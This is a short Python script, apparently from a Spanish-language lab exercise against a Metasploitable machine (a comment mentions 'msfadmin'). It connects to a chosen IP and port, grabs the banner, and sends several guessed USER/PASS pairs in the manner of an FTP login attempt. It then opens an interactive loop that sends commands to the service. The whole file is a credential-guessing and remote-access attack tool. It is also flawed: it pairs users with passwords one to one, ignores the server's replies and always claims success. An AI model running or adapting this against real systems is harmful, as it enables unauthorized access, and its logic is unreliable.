import socket
import time

#cliente

def conexion_pc(ip,puerto):
    try:
        cliente_socket.connect((ip,puerto))
        respuesta_connect = cliente_socket.recv(1024).decode("utf-8")
        print(str("\t[*] Version del puerto mencionado: "+respuesta_connect + "\n\t[+] Ha logrado conectarse.\n"))
        print("\tEjecutando.. entrada al puerto\n")
        time.sleep(3)
        return cliente_socket    
    
    except socket.error as e:
        print(str(respuesta_connect + "\n[-] No ha podido ser conectado."))
    

def conexion_user_pass(list_user,list_pass):
    try:
        for user,pwd in zip(list_user, list_pass):
            cliente_socket.send((f"USER {user}\r\n").encode())
            #user
            respuesta_usuario = cliente_socket.recv(1024).decode("utf-8")
            #pass
            cliente_socket.send((f"PASS {pwd}\r\n").encode())
            respuesta_pwd = cliente_socket.recv(1024).decode("utf-8")
        
        print("[+] Ha ingresado con exito.\n")
        
    except socket.error as e:
        print(e)

def msg():
    #try:
        print("[+] Digite por consola un comando del SO.")
        print("[-] Digite por consola 'exit' para salir.")
        while True: 
            consola = input(">> ")
            if consola.lower() == 'exit':
                print("Fin del programa..")
                break
            
            cliente_socket.send((consola+ "\r\n").encode()) 
            respuesta_msg = cliente_socket.recv(1024).decode("utf-8")
            print("*> "+respuesta_msg)
                
    #except socket.error as e:
    #    print(e, "\n[-] El mensaje no pudo ser emitido")

if __name__ == "__main__":
    cliente_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("\nEn este script tomara acceso remoto a un puerto.\n")
    #conexion
    ip = input("\t[*] Digite la IP: ")
    puerto = int(input("\t[*] Digite el puerto: "))
    conexion_pc(ip,puerto)

    #conexion usuario y contrasena
    list_user = []
    list_pass = []
    print("[-] Para ingresar al sistema se requiere el nombre de usuario y su clave.")
    #usuario
    #En mi caso el usuario y contrasena era "msfadmin"
    print("[*] Digite 5 posibles nombres de usuarios:\n")
    for i in range(1,6):
        user = input(f"\t[*] Digite usuario {i}: ")
        list_user.append(user)
    print(f"[+] Posibles usuarios para ingresar: Lista >> {list_user}\n")    
    #clave
    print("[*] Digite 5 posibles claves de usuarios:")
    for i in range(1,6):
        pwd = input(f"\t[*] Digite clave {i}: ")
        list_pass.append(pwd)
    print(f"[+] Posibles claves para ingresar: Lista >> {list_pass}\n")
    print("Intentando ingresar..")

    conexion_user_pass(list_user,list_pass)

    msg() #Aca puede interactuar con el sistema


    cliente_socket.close()